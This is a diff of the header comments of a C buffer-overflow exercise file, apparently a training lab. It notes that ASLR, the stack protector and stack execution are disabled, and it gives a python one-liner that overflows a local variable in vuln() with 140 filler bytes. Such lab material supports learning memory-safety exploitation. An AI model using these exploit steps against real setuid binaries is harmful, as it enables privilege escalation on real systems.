@@ -9,10 +9,9 @@
 #define Y "\033[33m"
 
 // ASLR OFF
-// COMPILE $ gcc -fno-stack-protector bof3.c -o bof3
-// SETUID  $ sudo chown root:root bof3
-//         $ sudo chmod 4755 bof3
-// EXPLOIT $ (python -c "print 'a\x00\x00\x00'+'x'*140";cat) | ./bof3
+// STACK-PROTECTOR OFF
+// STACK-EXECUTION OFF
+// EXPLOIT $ (python -c "print 'x'*140+'a\x00\x00\x00'";cat) | ./bof3
 
 void vuln() {
     int innocent;
